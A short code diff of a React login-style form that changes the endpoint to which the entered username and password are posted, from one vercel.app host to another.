@@ -16,7 +16,7 @@ function Form({ callback }) {
         }
 
         // Simple validación sin autenticación
-        fetch('https://back-sorteo.vercel.app', {
+        fetch('https://fron-sigma.vercel.app', {
             method: 'POST',
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username, password })
